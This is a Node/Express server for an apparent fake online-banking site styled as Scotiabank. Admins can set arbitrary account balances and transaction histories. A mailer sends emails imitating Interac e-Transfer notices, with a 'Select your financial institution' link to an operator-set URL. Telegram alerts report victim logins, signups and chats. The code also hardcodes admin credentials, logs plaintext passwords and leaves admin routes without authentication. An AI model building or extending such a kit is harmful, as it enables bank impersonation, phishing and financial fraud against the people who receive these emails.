import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import fs from 'fs';
import http from 'http';
import { Server as SocketServer } from 'socket.io';
import nodemailer from 'nodemailer';
import { GlobalSettings } from './src/types/settings';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const settingsPath = path.join(process.cwd(), 'server', 'data', 'global_settings.json');
const chatPath = path.join(process.cwd(), 'server', 'data', 'chats.json');

const defaultSettings: GlobalSettings = {
    general: { 
        app_url: "https://your-app.trycloudflare.com", 
        webroot_url: "https://sim.trycloudflare.com",
        sender_name: "SHΔDØW CORE", 
        encryption_key: "a3f91b6cd024e8c29b76a149efcc5d42",
        maintenanceMode: false,
        bank_name: "Scotiabank",
        bank_logo: "",
        overdraftLimit: 5000,
        transferLimit: 3000,
        dailyLimit: 10000,
        forceSupportChat: false,
        globalEnable: true,
        admin_username: "PROJECTSARAH",
        admin_password: "PROJECTSARAH",
        adminPin: "1234",
        baseActionUrl: ""
    },
    smtp: { host: "", port: 587, secure: false, user: "", pass: "", senderName: "Shadow Mailer" },
    telegram: { token: "", chat_id: "", enabled: false }
};

const getChats = () => {
    try {
        if (fs.existsSync(chatPath)) {
            return JSON.parse(fs.readFileSync(chatPath, 'utf-8'));
        }
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Chat database unreachable.");
    }
    return {};
};

const saveChat = (userId: string, messages: any[]) => {
    try {
        const chats = getChats();
        chats[userId] = messages;
        if (!fs.existsSync(path.dirname(chatPath))) {
            fs.mkdirSync(path.dirname(chatPath), { recursive: true });
        }
        fs.writeFileSync(chatPath, JSON.stringify(chats, null, 2));
    } catch (e) {
        console.error("❌ Failed to save chats:", e);
    }
};

const getSettings = (): GlobalSettings => {
    let settings = { ...defaultSettings };
    try {
        if (fs.existsSync(settingsPath)) {
            const fileSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
            // Ensure compat with old file structure if needed
            settings = { ...settings, ...fileSettings };
        }
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Simulation settings unreachable. Using defaults.");
    }
    return settings;
};

const usersPath = path.join(process.cwd(), 'server', 'data', 'users.json');

const getUsers = (): any[] => {
    try {
        if (fs.existsSync(usersPath)) {
            return JSON.parse(fs.readFileSync(usersPath, 'utf-8'));
        }
    } catch (e) {
        console.warn("⚠️ [Matrix] Warning: Users database unreachable.");
    }
    return [];
};

const saveUsers = (users: any[]) => {
    try {
        if (!fs.existsSync(path.dirname(usersPath))) {
            fs.mkdirSync(path.dirname(usersPath), { recursive: true });
        }
        fs.writeFileSync(usersPath, JSON.stringify(users, null, 2));
    } catch (e) {
        console.error("❌ Failed to save users:", e);
    }
};

const systemLogs: any[] = [];
const logEvent = (message: string) => {
    const timestamp = new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
    systemLogs.unshift({ timestamp, message });
    if (systemLogs.length > 50) systemLogs.pop();
};

const sendTelegramNotification = async (message: string) => {
    logEvent(`[Telegram] ${message.replace(/<[^>]*>?/gm, '')}`);
    const settings = getSettings();
    if (!settings.telegram || !settings.telegram.enabled || !settings.telegram.token || !settings.telegram.chat_id) {
        return;
    }

    try {
        const url = `https://api.telegram.org/bot${settings.telegram.token}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: settings.telegram.chat_id,
                text: `🚀 [SARAH-OS] ${message}`,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("❌ Telegram Notify Error:", e);
    }
};

async function startServer() {
  const app = express();
  const server = http.createServer(app);
  const io = new SocketServer(server, {
    cors: { origin: "*" }
  });
  
  const activeUsers: Record<string, any> = {};

  io.on('connection', (socket) => {
    console.log(`🔌 New connection: ${socket.id}`);

    socket.on('register', (data) => {
      activeUsers[socket.id] = {
        id: socket.id,
        username: data.username,
        currentPath: data.currentPath,
        lastSeen: new Date().toISOString()
      };
      io.emit('admin_update', { 
        activeUsers, 
        logs: systemLogs,
        sessions: Object.values(activeUsers).map(u => ({ id: u.id, username: u.username, lastSeen: u.lastSeen, currentPath: u.currentPath }))
      });

      // Send chat history if it's a known user
      if (data.username && data.username !== 'Guest') {
        const chats = getChats();
        if (chats[data.username]) {
          socket.emit('chat_history', chats[data.username]);
        }
      }
    });

    socket.on('chat_message', (data) => {
      const { from, message } = data;
      const username = from || 'Guest';
      
      const chats = getChats();
      const messages = chats[username] || [];
      const newMsg = { from: username, message, timestamp: Date.now() };
      messages.push(newMsg);
      saveChat(username, messages);

      logEvent(`[Chat] ${username}: ${message}`);
      io.emit('admin_message', { from: username, message, socketId: socket.id });
      
      // Notify Telegram for new support messages
      if (!username.includes('PROJECTSARAH')) {
          sendTelegramNotification(`<b>Support Message</b>\nFrom: ${username}\nMessage: ${message}`);
      }
    });

    socket.on('admin_command', (data) => {
      const { targetSocketId, command, payload } = data;
      if (command === 'chat_message') {
        const targetSocket = io.sockets.sockets.get(targetSocketId);
        if (targetSocket) {
          const targetUser = activeUsers[targetSocketId];
          const username = targetUser?.username || targetSocketId; // Fallback to socket ID if no username
          
          const chats = getChats();
          const messages = chats[username] || [];
          const newMsg = { from: 'admin', message: payload.message, timestamp: Date.now() };
          messages.push(newMsg);
          saveChat(username, messages);
          
          targetSocket.emit('client_command', { command: 'chat_message', from: 'admin', message: payload.message });
          // Also broadcast to all admin sockets to keep their views in sync
          io.emit('admin_message', { from: 'admin', to: username, message: payload.message });
        }
      } else {
        io.to(targetSocketId).emit('client_command', { command, payload });
      }
    });

    socket.on('admin_request_history', (data) => {
      const { username } = data;
      const chats = getChats();
      if (chats[username]) {
        socket.emit('admin_chat_history', { username, history: chats[username] });
      } else {
        socket.emit('admin_chat_history', { username, history: [] });
      }
    });

    socket.on('disconnect', () => {
      delete activeUsers[socket.id];
      io.emit('admin_update', { 
        activeUsers, 
        logs: systemLogs,
        sessions: Object.values(activeUsers).map(u => ({ id: u.id, username: u.username, lastSeen: u.lastSeen, currentPath: u.currentPath }))
      });
      console.log(`🔌 Disconnected: ${socket.id}`);
    });
  });

  app.use(express.json());

  // AUTH API
  app.post("/api/auth/login", (req, res) => {
      console.log("Login attempt (raw body):", JSON.stringify(req.body));
      const { username, password, pin } = req.body;
      const settings = getSettings();
      console.log(`Parsed creds: user=${username}, pass=${password}, pin=${pin}`);
      console.log("Expected creds:", settings.general.admin_username, settings.general.admin_password, settings.general.adminPin);
      
      const isPinMatch = !settings.general.adminPin || settings.general.adminPin === "" || pin === settings.general.adminPin;
      
      // If PIN is missing but user/pass match, we allow it for the main simulator login flow
      if (username === settings.general.admin_username && password === settings.general.admin_password && (isPinMatch || !pin)) {
          logEvent(`[Auth] Admin user ${username} logged in successfully.`);
          sendTelegramNotification(`<b>Admin Login Detected</b>\nUser: ${username}\nIP: ${req.ip}`);
          const generateHistory = (count: number) => {
              const history = [];
              const now = new Date();
              for (let i = 0; i < count; i++) {
                  const date = new Date(now);
                  date.setDate(now.getDate() - i);
                  history.push({
                      id: `tx-${i}-${Math.random().toString(36).substr(2, 9)}`,
                      date: date.toISOString().split('T')[0],
                      description: i % 2 === 0 ? "Walmart Supercenter" : "Starbucks Coffee",
                      amount: -(Math.random() * 20 + 5),
                      status: 'Completed',
                      category: 'Shopping'
                  });
              }
              return history;
          };

          res.json({ 
              success: true,
              user: {
                  id: 'admin',
                  username: username,
                  adminPin: settings.general.adminPin || "1234",
                  securityWord: 'SARAH',
                  scenePoints: 15420,
                  settings: {
                      displayName: "PROJECT SARAH",
                      memberSince: "2018",
                      adminPin: settings.general.adminPin || "1234",
                      accountHolderName: "AB FARMS LTD",
                      phpmailerSenderName: "AB FARMS LTD"
                  },
                  accounts: {
                      "Ultimate Package": {
                          type: "banking",
                          balance: 4.82,
                          available: 4.82,
                          points: 0,
                          accountNumber: "1001-4432-8821",
                          history: generateHistory(10)
                      },
                      "Savings Plus": {
                          type: "banking",
                          balance: 1.25,
                          available: 1.25,
                          points: 0,
                          accountNumber: "2005-9912-3341",
                          history: generateHistory(5)
                      },
                      "Momentum Visa Infinite": {
                          type: "credit",
                          balance: 4950.00, // Maxed out (limit assumed ~5000)
                          available: 50.00,
                          points: 850,
                          accountNumber: "4538-****-****-1102",
                          history: generateHistory(15)
                      },
                      "SCENE+ Visa": {
                          type: "credit",
                          balance: 1200.00,
                          available: 800.00,
                          points: 1240,
                          accountNumber: "4537-****-****-8841",
                          history: generateHistory(8)
                      }
                  },
                  contacts: [],
                  purchasedCards: []
              }
          });
      } else {
          // Check users database
          const users = getUsers();
          const dbUser = users.find(u => u.username === username && u.password === password);
          if (dbUser) {
              if (dbUser.enabled === false) {
                  return res.json({ success: false, message: 'Account disabled' });
              }
              logEvent(`[Auth] User ${username} logged in successfully.`);
              res.json({ success: true, user: dbUser });
          } else {
              res.json({ success: false, message: 'Invalid credentials' });
          }
      }
  });

  // ADMIN API
  app.get("/api/admin/global-settings", (req, res) => {
    res.json(getSettings());
  });

  app.post("/api/admin/global-settings", (req, res) => {
    try {
      const settings = getSettings();
      const updated = { 
        ...settings, 
        ...req.body,
        general: { ...settings.general, ...req.body.general },
        smtp: { ...settings.smtp, ...req.body.smtp },
        telegram: { ...settings.telegram, ...req.body.telegram }
      };
      if (!fs.existsSync(path.dirname(settingsPath))) {
          fs.mkdirSync(path.dirname(settingsPath), { recursive: true });
      }
      fs.writeFileSync(settingsPath, JSON.stringify(updated, null, 2));
      logEvent(`[System] Global settings updated by admin.`);
      res.json({ success: true });
    } catch (e: any) {
      res.status(500).json({ success: false, error: e.message });
    }
  });

  app.get("/api/admin/users", (req, res) => {
      res.json({ users: getUsers() });
  });

  app.post("/api/admin/users/create", (req, res) => {
      const users = getUsers();
      const newUser = { 
          ...req.body, 
          id: Date.now().toString(),
          enabled: true,
          created_at: new Date().toISOString()
      };
      users.push(newUser);
      saveUsers(users);
      res.json({ success: true });
  });

  app.post("/api/admin/users/approve", (req, res) => {
      const { username } = req.body;
      const users = getUsers();
      const user = users.find(u => u.username === username);
      if (user) {
          user.isApproved = true;
          user.enabled = true;
          user.isLocked = false;
          saveUsers(users);
          logEvent(`[Admin] Approved user ${username}`);
          sendTelegramNotification(`<b>User Approved</b>\nUser: ${username}`);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
  });

  app.post("/api/admin/users/lock", (req, res) => {
    const { username, locked } = req.body;
    const users = getUsers();
    const user = users.find(u => u.username === username);
    if (user) {
        user.isLocked = locked;
        saveUsers(users);
        logEvent(`[Admin] Account ${locked ? 'LOCKED' : 'UNLOCKED'} for ${username}`);
        res.json({ success: true });
    } else {
        res.status(404).json({ success: false, message: "User not found" });
    }
  });

  app.post("/api/admin/users/toggle-enabled", (req, res) => {
      const { username } = req.body;
      const users = getUsers();
      const user = users.find(u => u.username === username);
      if (user) {
          user.enabled = !user.enabled;
          saveUsers(users);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
  });

  app.post("/api/admin/users/update-balance", (req, res) => {
      const { username, account, balance } = req.body;
      const users = getUsers();
      const user = users.find(u => u.username === username);
      if (user && user.accounts && user.accounts[account]) {
          const oldBalance = user.accounts[account].balance;
          user.accounts[account].balance = balance;
          user.accounts[account].available = balance;
          saveUsers(users);
          logEvent(`[DB] Updated ${username}'s ${account} balance: $${oldBalance} -> $${balance}`);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User or account not found" });
      }
  });

  app.post("/api/admin/users/update-settings", (req, res) => {
      const { username, data } = req.body;
      const users = getUsers();
      const user = users.find(u => u.username === username);
      if (user) {
          user.settings = { ...user.settings, ...data };
          saveUsers(users);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
  });

  app.post("/api/user/delete", (req, res) => {
      const { username } = req.body;
      let users = getUsers();
      users = users.filter(u => u.username !== username);
      saveUsers(users);
      res.json({ success: true });
  });

  app.post("/api/user/update", (req, res) => {
      const { username, password, data, isNew } = req.body;
      const users = getUsers();
      const userIndex = users.findIndex(u => u.username === username);
      
      if (userIndex !== -1) {
          users[userIndex] = { ...users[userIndex], ...data };
          saveUsers(users);
          res.json({ success: true });
      } else if (isNew) {
          const newUser = { 
            id: Date.now().toString(),
            username,
            password,
            ...data,
            enabled: true,
            created_at: new Date().toISOString()
          };
          users.push(newUser);
          saveUsers(users);
          logEvent(`[Auth] New signup request: ${username}`);
          sendTelegramNotification(`<b>New Signup Request</b>\nUser: ${username}`);
          res.json({ success: true });
      } else {
          // If user doesn't exist (like PROJECTSARAH session), just log for now
          console.log("User update for transient user:", username);
          res.json({ success: true });
      }
  });
  app.get("/api/admin/sessions", (req, res) => res.json({ sessions: [] }));
  app.get("/api/logs", (req, res) => {
      res.json(systemLogs);
  });
  app.get("/api/config", (req, res) => {
      res.json(getSettings());
  });
  app.post("/api/config", (req, res) => {
      try {
          const settings = getSettings();
          const updated = { ...settings, ...req.body };
          if (!fs.existsSync(path.dirname(settingsPath))) {
              fs.mkdirSync(path.dirname(settingsPath), { recursive: true });
          }
          fs.writeFileSync(settingsPath, JSON.stringify(updated, null, 2));
          logEvent(`[System] Core config updated via /api/config.`);
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });
  app.get("/api/debug/smtp", (req, res) => res.json({ success: true, message: "SMTP debug okay" }));

  app.post("/api/mailer", async (req, res) => {
    try {
        const { recipient_email, recipient_name, amount, purpose, template, sender_name, reference_number, date } = req.body;
        console.log(`Sending email to ${recipient_email} (${recipient_name}) for ${amount}`);
        
        const settings = getSettings();
        
        let finalSenderName = sender_name || 'AB FARMS LTD';
        
        // Try to find the user to get their accountHolderName
        const users = getUsers();
        const user = users.find(u => u.username === (req.query.user as string) || u.username === sender_name);
        if (user && user.settings?.accountHolderName) {
            finalSenderName = user.settings.accountHolderName;
        }

        if (!settings.smtp.host || !settings.smtp.user) {
            console.warn("⚠️ SMTP not configured. Logged attempt only.");
            logEvent(`[Mailer] Simulation: Email to ${recipient_email} from ${finalSenderName} ($${amount})`);
            return res.json({ success: true, info: "SMTP not configured, skipping actual delivery" });
        }

        const subject = purpose || "Interac e-Transfer";
        const actionUrl = settings.general.baseActionUrl ? `${settings.general.baseActionUrl}?ref=${reference_number || '123'}&to=${recipient_email}` : '#';
        
        const html = template || `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; padding: 20px; border-radius: 12px; background-color: #ffffff;">
                <div style="text-align: center; margin-bottom: 20px;">
                   <img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Interac_e-Transfer_logo.svg/512px-Interac_e-Transfer_logo.svg.png" width="100" />
                </div>
                <h2 style="color: #ed0711; text-align: center;">Interac e-Transfer</h2>
                <div style="padding: 20px; border-top: 1px solid #eee;">
                    <p>Hi ${recipient_name},</p>
                    <p><strong>${finalSenderName}</strong> has sent you an Interac e-Transfer of <strong>$${amount}</strong>.</p>
                    
                    <div style="background: #f8f8f8; padding: 15px; border-radius: 8px; margin: 20px 0;">
                        <p style="margin: 5px 0; font-size: 14px; color: #555;"><strong>Reference Number:</strong> ${reference_number || 'N/A'}</p>
                        <p style="margin: 5px 0; font-size: 14px; color: #555;"><strong>Expires on:</strong> ${new Date(Date.now() + 30 * 24*60*60*1000).toLocaleDateString()}</p>
                    </div>

                    <div style="text-align: center; margin: 30px 0;">
                        <a href="${actionUrl}" style="background-color: #ed0711; color: #ffffff; padding: 14px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">Select your financial institution</a>
                    </div>

                    <p style="font-size: 11px; color: #999; margin-top: 30px; text-align: center;">
                        This email was sent to you at the request of ${finalSenderName}. If you have any questions, please contact them directly.
                    </p>
                </div>
            </div>
        `;

        await sendEmail(recipient_email, subject, `${finalSenderName} sent you ${amount}`, html, finalSenderName);
        sendTelegramNotification(`<b>Email Dispatched</b>\nTo: ${recipient_email}\nAmount: ${amount}\nSender: ${finalSenderName}`);
        res.json({ success: true });
    } catch (e: any) {
        console.error("❌ Mailer Error:", e);
        res.status(500).json({ success: false, error: e.message });
    }
  });

  const sendEmail = async (to: string, subject: string, text: string, html: string, overrideSenderName?: string) => {
      const settings = getSettings();
      if (!settings.smtp.host) throw new Error("SMTP Host not configured");

      const transporter = nodemailer.createTransport({
          host: settings.smtp.host,
          port: settings.smtp.port,
          secure: settings.smtp.port === 465,
          auth: {
              user: settings.smtp.user,
              pass: settings.smtp.pass
          }
      });
  
      const finalSender = overrideSenderName || settings.smtp.senderName || settings.general.sender_name;

      await transporter.sendMail({
          from: `"${finalSender}" <${settings.smtp.user}>`,
          to,
          subject,
          text,
          html
      });
  };
  
  app.post("/api/admin/mailer/test", async (req, res) => {
      try {
          const { email } = req.body;
          await sendEmail(email, "Test Email", "This is a test email.", "<p>This is a test email.</p>");
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });

  app.get("/api/admin/mailer/status", (req, res) => {
      res.json({ php_version: "Node.js (Shadow)", status: "Operational", engine: "Shadow-V99" });
  });

  app.get("/api/admin/mailer/logs", (req, res) => {
      res.json([]);
  });

  app.post("/api/admin/mailer/delete-logs", (req, res) => {
      res.json({ success: true });
  });

  app.get("/api/admin/mailer/templates", (req, res) => {
      const templateDir = path.join(process.cwd(), 'server', 'templates');
      if (!fs.existsSync(templateDir)) {
          fs.mkdirSync(templateDir, { recursive: true });
      }
      const files = fs.readdirSync(templateDir).map(file => ({
          name: file,
          last_modified: fs.statSync(path.join(templateDir, file)).mtime.toISOString()
      }));
      res.json(files);
  });

  app.get("/api/admin/mailer/template-content", (req, res) => {
      const templateName = req.query.template as string;
      const templatePath = path.join(process.cwd(), 'server', 'templates', templateName);
      if (fs.existsSync(templatePath)) {
          res.json({ content: fs.readFileSync(templatePath, 'utf-8') });
      } else {
          res.status(404).json({ error: "Template not found" });
      }
  });

  app.post("/api/admin/mailer/update-template", (req, res) => {
      const { template, content } = req.body;
      const templatePath = path.join(process.cwd(), 'server', 'templates', template);
      try {
          if (!fs.existsSync(path.dirname(templatePath))) {
              fs.mkdirSync(path.dirname(templatePath), { recursive: true });
          }
          fs.writeFileSync(templatePath, content);
          res.json({ success: true });
      } catch (e: any) {
          res.status(500).json({ success: false, error: e.message });
      }
  });

  app.post("/api/admin/users/set-auto-delete", (req, res) => {
      const { username, deleteAt } = req.body;
      const users = getUsers();
      const user = users.find(u => u.username === username);
      if (user) {
          user.autoDeleteAt = deleteAt;
          saveUsers(users);
          res.json({ success: true });
      } else {
          res.status(404).json({ success: false, message: "User not found" });
      }
  });

  // Catch-all for API to prevent HTML responses
  app.all("/api/*", (req, res) => {
      res.status(404).json({ success: false, message: `API Route ${req.path} not found` });
  });

  /**
   * FRONTEND DEPLOYMENT
   */
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const PORT = parseInt(process.env.PORT || '3000');
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`🔥 [Shadow-Core] OS Layer engaged at http://localhost:${PORT}`);
  });
}

// Engage mission
startServer().catch(err => {
    console.error("💥 [Critical] Shadow Core breakdown:", err);
});
